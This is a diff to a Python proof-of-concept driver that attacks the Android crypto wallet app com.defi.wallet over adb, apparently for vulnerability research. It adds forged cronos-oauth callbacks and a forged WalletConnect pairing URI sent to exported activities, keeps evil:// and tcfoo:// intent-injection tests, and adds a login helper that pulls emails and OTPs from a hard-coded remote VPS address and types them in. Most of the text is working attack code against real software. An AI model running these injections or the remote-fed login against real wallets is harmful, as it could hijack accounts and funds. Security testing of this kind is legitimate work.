@@ -2,9 +2,11 @@
 """ult_drive.py — dump-driven onboarding + deeplink PoC driver for com.defi.wallet.
 Runs on a host with adb attached to the arm64 emulator (TCG — all sleeps generous).
 Produces: /tmp/ult/attack.log, screenshots, ui dumps, verdict lines.
-No account/email needed: local wallet onboarding only.
+r9: optional VPS-assisted login (own account only — RULES.md) if the login screen
+exposes an input; everything still works pre-login without any credentials.
 """
 import subprocess, time, os, re, datetime, sys
+import json, urllib.request
 
 OUT = "/tmp/ult"
 os.makedirs(OUT, exist_ok=True)
@@ -154,7 +156,10 @@ ONB_KEYWORDS = [
 WELCOME_RE = re.compile(r"login with google|sign in with google|welcome|trade what")
 
 def app_alive():
-    o = sh("pidof com.defi.wallet", 20)
+    # r9 FIX (root cause of the 40-min relaunch-only loop in r6/r7/r8): sh() runs
+    # on the RUNNER host, so `pidof` must go through adb. Host pidof was always
+    # empty -> app "always dead" -> onboard() only ever relaunched, never dumped.
+    o = sh("adb shell pidof com.defi.wallet", 20)
     return bool(o.strip()) and "TIMEOUT" not in o
 
 def launcher_up():
@@ -170,6 +175,7 @@ def relaunch(tag):
 
 def onboard(max_rounds=60, budget_s=2400):
     seen = []
+    relaunch_n = 0
     t_end = time.time() + budget_s   # cold RN init under TCG ~25-40 min (round-4: JS at +23min)
     for i in range(max_rounds):
         if time.time() > t_end:
@@ -177,9 +183,17 @@ def onboard(max_rounds=60, budget_s=2400):
             break
         # round-6: recover instead of waiting on a dead/backgrounded app forever
         # (round-5 spent all 30 rounds dumping the launcher because of this)
+        # r9: cap the relaunch path — 5 consecutive relaunches with the target
+        # package still foregrounded means the app IS alive (defensive: never
+        # burn a whole budget in relaunch-only again).
         if launcher_up() or not app_alive():
-            relaunch(f"onb{i}")
-            continue
+            if relaunch_n < 5 or PKG not in resumed():
+                relaunch_n += 1
+                relaunch(f"onb{i}")
+                continue
+            log("ONB: repeated relaunch but pkg foreground -> continue as alive")
+        else:
+            relaunch_n = 0
         xml = dump(f"onb{i}")
         t = txt(xml)
         log(f"ONB{i}: {t[:400]}")
@@ -245,6 +259,115 @@ def onboard(max_rounds=60, budget_s=2400):
                 log("ONB: home-like screen stable -> exiting onboard")
                 return True
     return False
+
+# ------------------------------------------------------- r9: login assist + pre-login surface
+ASSIST_URL = os.environ.get("ASSIST_URL", "http://43.156.21.122:8081/ua_9x42k1.json")
+
+def assist_get(stage, timeout_s=900):
+    """Poll the VPS assist file for {stage: value} (own-account email/OTP supplied
+    by the operator). Returns None on timeout. Read-only GET; file lives on the
+    same port that already serves the APK parts to this runner."""
+    t0 = time.time()
+    while time.time() - t0 < timeout_s:
+        try:
+            r = urllib.request.urlopen(
+                ASSIST_URL + "?ts=" + str(int(time.time())), timeout=15).read().decode()
+            d = json.loads(r)
+            if d.get(stage):
+                log(f"ASSIST stage={stage} received")
+                return str(d[stage])
+        except Exception as e:
+            log(f"ASSIST poll: {type(e).__name__}: {e}"[:160])
+        time.sleep(15)
+    log(f"ASSIST stage={stage} TIMEOUT ({timeout_s}s)")
+    return None
+
+def adb_type(s):
+    # `input text` breaks on quotes/backticks/$ via double shell interpretation —
+    # strip them and log if anything was removed (operator picks compatible OTP/
+    # password; email addresses never contain these).
+    clean = re.sub(r"[\\'\"`$]", "", str(s))
+    if clean != str(s):
+        log(f"TYPE: sanitized chars removed ({len(str(s))} -> {len(clean)})")
+    sh(f"adb shell input text '{clean.replace(' ', '%s')}'", 45)
+
+def login_probe():
+    """r9: the ONLY pre-login affordance on the login wall is the 'Login with
+    Google' button (no email field, no create-wallet — verified from the dump).
+    Tap it, classify what happens, and if an input appears drive it with the
+    VPS-assisted email/OTP. Returns: no_button | gms_blocked | no_input |
+    assisted_login_ok | assisted_login_fail."""
+    x = dump("probe0")
+    btn = find(x, "login with google", clickable_only=True) or \
+          find(x, "google", clickable_only=True)
+    if not btn:
+        log("PROBE: no google button on screen"); return "no_button"
+    tap(btn); time.sleep(30)
+    x = dump("probe1")
+    low = txt(x).lower()
+    log(f"PROBE after tap: {txt(x)[:300]}")
+    shot("probe1")
+    if "play services" in low or ("couldn't" in low and "sign" in low) \
+       or "not available" in low:
+        log("PROBE=gms_unavailable (ATD image has no GMS)"); return "gms_blocked"
+    # email/OTP input of any kind -> assist channel
+    has_input = any(n["cls"].lower().endswith("edittext") for n in nodes(x))
+    if not (has_input or "email" in low or "phone" in low or "verify" in low
+            or "one-time" in low or "code" in low):
+        log("PROBE=no_input (flow unknown / stuck)"); shot("probe_noinput")
+        return "no_input"
+    email = assist_get("email", 120)
+    if not email:
+        log("PROBE: no email provided via assist -> abort login"); return "no_input"
+    # tap the first input, type, submit (next/sign/continue/send)
+    inp = next((n for n in nodes(x) if n["cls"].lower().endswith("edittext")), None)
+    if inp and tap(inp):
+        time.sleep(3); adb_type(email); time.sleep(2)
+        sh("adb shell input keyevent 66", 20)   # ENTER
+        time.sleep(15)
+    # up to 3 follow-up input rounds (otp / password / resend prompt)
+    for rnd in range(3):
+        x = dump(f"probe_in{rnd}")
+        low = txt(x).lower()
+        log(f"PROBE in{rnd}: {txt(x)[:250]}")
+        shot(f"probe_in{rnd}")
+        if not any(n["cls"].lower().endswith("edittext") for n in nodes(x)):
+            log(f"PROBE in{rnd}: no input — login likely completed"); break
+        stage = "otp" if rnd == 0 else f"step{rnd}"
+        val = assist_get(stage, 900)
+        if not val:
+            log(f"PROBE: assist '{stage}' timeout -> abort login"); return "assisted_login_fail"
+        inp = next((n for n in nodes(x) if n["cls"].lower().endswith("edittext")), None)
+        if inp and tap(inp):
+            time.sleep(3); adb_type(val); time.sleep(2)
+            sh("adb shell input keyevent 66", 20)
+            time.sleep(15)
+    x = dump("probe_final")
+    low = txt(x).lower()
+    gone = not WELCOME_RE.search(low)
+    log(f"PROBE final: welcome_gone={gone} ui={txt(x)[:250]}")
+    return "assisted_login_ok" if gone else "assisted_login_fail"
+
+def t10_oauth_forged():
+    # exported io.privy.sdk.oAuth.PriviRedirectActivity (scheme cronos-oauth):
+    # any app/browner on the device can inject an OAuth callback. OBSERVED record
+    # only (never CONFIRMED) — real proof comes from logcat.txt evidence review.
+    fire("cronos-oauth://oauth/callback?code=FORGED_R9&state=FORGED_R9", "T10_OAUTH")
+    x = dump("t10"); r = resumed()
+    verdict_line("T10_oauth_forged_callback_observed", False,
+                 f"resumed={r[:180]} ui={txt(x)[:180]}", ui_ok=True)
+    back(); time.sleep(SLEEP)
+
+def t11_wc_injection():
+    # wc: scheme is handled by the exported TransferStationActivity — inject a
+    # forged WalletConnect pairing URI and record what the app does pre-login.
+    fire("wc:7f3a9c2e4b1d5a6f8e0c2b4d6a8f1e3c@1?relay-protocol=irn"
+         "&symKey=0000000000000000000000000000000000000000000000000000000000000000",
+         "T11_WC")
+    x = dump("t11"); r = resumed()
+    verdict_line("T11_wc_pairing_observed", False,
+                 f"resumed={r[:180]} ui={txt(x)[:200]}", ui_ok=True)
+    back(); time.sleep(SLEEP)
 
 # ---------------------------------------------------------------- tests
 def verdict_line(cid, ok, why, ui_ok=None):
@@ -320,7 +443,10 @@ def t5_lock():
     t = txt(x).lower()
     locked = any(k in t for k in ("passcode", "enter passcode", "pin", "fingerprint", "unlock"))
     swap_visible = "123.45" in t
-    verdict_line("T5_deeplink_behind_lock", True,
+    # r9 honesty: ok = the swap screen actually rendered with attacker prefill
+    # (that IS the vuln claim). locked/resumed stay as evidence in `why` — the
+    # old hardcoded True produced a fake CONFIRMED every round.
+    verdict_line("T5_deeplink_behind_lock", swap_visible,
                  f"locked_overlay={locked} swap_prefill_behind_lock={swap_visible} "
                  f"resumed_before={r0[:150]} resumed_after={r1[:150]} ui={txt(x)[:200]}")
     back(); time.sleep(SLEEP)
@@ -364,18 +490,27 @@ def t9_popup_chain():
     back(); time.sleep(SLEEP)
 
 def t7_negatives():
-    # explicit intent with non-whitelisted scheme -> app should drop it
+    # explicit intent with non-whitelisted scheme -> app should drop it.
+    # r9 honesty: vuln claim = validator ACCEPTS evil:// (new screen appears);
+    # a clean drop is recorded in `why` as a passed control, never as CONFIRMED.
     log("T7: explicit evil:// intent to TransferStation (expect validator drop)")
+    r0 = resumed()
     sh("adb shell \"am start -W -n com.defi.wallet/com.defi.cronos.manager.TransferStationActivity"
        " -a android.intent.action.VIEW -d 'evil://x'\"", 60)
     time.sleep(SLEEP)
     x = dump("t7"); shot("t7")
     r = resumed()
-    verdict_line("T7_validator_negative", True, f"resumed={r[:200]} ui={txt(x)[:150]}", ui_ok=True)
+    dropped = (r == r0) or ("Splash" in r) or ("CronosOnBoarding" in r)
+    verdict_line("T7_validator_evil_scheme_accepted", not dropped,
+                 f"validator_dropped={dropped} resumed_before={r0[:120]} "
+                 f"resumed={r[:120]} ui={txt(x)[:150]}", ui_ok=True)
     # startsWith('tc') looseness: tcfoo:// accepted by validator but no nav route
+    r20 = resumed()
     fire_explicit("tcfoo://anything", "T7B_tc_prefix")
     r2 = resumed()
-    verdict_line("T7B_tc_prefix_passes_starts", True, f"resumed={r2[:200]}", ui_ok=True)
+    moved = (r2 != r20)
+    verdict_line("T7B_tc_prefix_accepted", moved,
+                 f"validator_moved_screen={moved} resumed={r2[:150]}", ui_ok=True)
 
 # ---------------------------------------------------------------- main
 def main():
@@ -386,6 +521,19 @@ def main():
     onb_ok = onboard()
     log(f"ONBOARD_DONE={onb_ok} resumed={resumed()}")
     shot("after_onboard")
+
+    # r9: pre-login attack surface FIRST (login would change app state):
+    #   T10 = forged cronos-oauth callback into exported PriviRedirectActivity
+    #   T11 = forged WalletConnect wc: pairing URI into exported TransferStation
+    t10_oauth_forged()
+    t11_wc_injection()
+    # r9: probe the login wall's only affordance; VPS-assist drives email/OTP
+    # when an input appears (own account, RULES.md). Classifies the flow either way.
+    pr = login_probe()
+    log(f"LOGIN_PROBE={pr}")
+    if pr == "assisted_login_ok":
+        onb2 = onboard(max_rounds=25, budget_s=900)
+        log(f"ONBOARD2_DONE={onb2} resumed={resumed()}")
 
     # start video ONLY now — onboarding/anr waiting must not eat the 40-min window
     rec_cmd = ("for i in $(seq 1 14); do adb shell \"screenrecord --time-limit 170 "
